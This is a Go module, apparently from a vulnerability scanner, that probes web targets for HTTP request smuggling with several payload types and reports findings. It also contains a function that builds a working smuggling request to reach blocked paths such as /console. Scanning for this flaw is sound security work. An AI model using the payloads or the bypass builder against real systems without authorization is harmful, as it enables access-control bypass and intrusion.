package Smuggling

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/socket"
	"github.com/GhostTroops/scan4all/lib/util"
	"log"
	"net/url"
	"strings"
)

func E2EC(s string) string {
	return strings.ReplaceAll(s, "\n", "\r\n")
}

// Interface definition
type Smuggling interface {
	CheckResponse(body string, payload string) bool
	GetPayloads(t *socket.CheckTarget) *[]string
	GetTimes() int
	GetVulType() string
}

var payload = []Smuggling{NewClCl(), NewCLTE(), NewCLTE2(), NewTECL(), NewTETE(), NewErr()}

//var payload = []Smuggling{NewErr()}

func checkSmuggling4Poc(ClTePayload *[]string, nTimes int, r1 *Smuggling, r *socket.CheckTarget) {
	for _, x := range *ClTePayload {
		s := r.SendOnePayload(x, r.UrlPath, r.HostName, nTimes)
		if "" != s && (*r1).CheckResponse(s, x) {
			log.Printf("found: %s\n%s\n", r.UrlRaw, s)
			// send result
			util.SendAnyData(&util.SimpleVulResult{
				Url:     r.UrlPath,
				VulKind: string(util.Scan4all),
				VulType: (*r1).GetVulType(),
				Payload: x,
			}, util.Scan4all)
			break
		}
	}
}

/*
	 check HTTP Request Smuggling
	 Smuggling can be used to try to access paths blocked by conventional means, e.g. weblogic pages
	  https://portswigger.net/web-security/request-smuggling/finding
	  https://hackerone.com/reports/1630668
	  https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L483
	  1. For each target, the login page is only tested once, i.e. once a login page path is found it is tested once
	  2. For each target, pages with the same context are tested only once; different contexts discovered by the crawler are each tested once
	  szBody is designed so that for the same url and same payload, the request is only sent once while being judged multiple times; such scenarios usually do not exist for Smuggling

	 do one http
		util.PocCheck_pipe <- &util.PocCheck{
			Wappalyzertechnologies: &[]string{"httpCheckSmuggling"},
			URL:                    finalURL,
			FinalURL:               finalURL,
			Checklog4j:             false,
		}
*/
func DoCheckSmuggling(szUrl string, szBody string) {
	for _, x := range payload {
		util.Wg.Add(1)
		go func(j Smuggling, szUrl string) {
			defer util.Wg.Done()
			if "" == szBody {
				x1 := socket.NewCheckTarget(szUrl, "tcp", 30)
				defer x1.Close()
				checkSmuggling4Poc(j.GetPayloads(x1), j.GetTimes(), &j, x1)
			} else {
				j.CheckResponse(szBody, "")
			}
		}(x, szUrl)
	}
}

// Build a smuggling request used to access blocked pages
//
//	After confirming the smuggling vulnerability exists, you can continue file fuzzing based on it
//	1. szUrl must be accessible (return 200), otherwise it may cause false positives
//	@szUrl the smuggling target
//	@smugglinUrlPath the page you want smuggling to reach, e.g. /console
//	@secHost the host of the second request's header
func GenerateHttpSmugglingPay(szUrl, smugglinUrlPath, secHost string) string {
	a := []string{`POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-Length: %d
Transfer-Encoding: chunked

`, `

GET %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
0`}
	u, err := url.Parse(strings.TrimSpace(szUrl))
	if nil != err {
		log.Println("GenerateHttpSmugglingPay url.Parse err: ", err)
		return ""
	}
	for i, x := range a {
		a[i] = strings.ReplaceAll(x, "\n", "\r\n")
	}
	sf := a[1]
	a[1] = fmt.Sprintf(sf, smugglinUrlPath, secHost)
	a[1] = fmt.Sprintf("%x", len(a[1])-1) + a[1]

	sf = a[0]
	a[0] = fmt.Sprintf(sf, u.RawPath, u.Host, util.GetCustomHeadersRaw(), len([]byte(a[1])))
	return strings.Join(a, "")
}
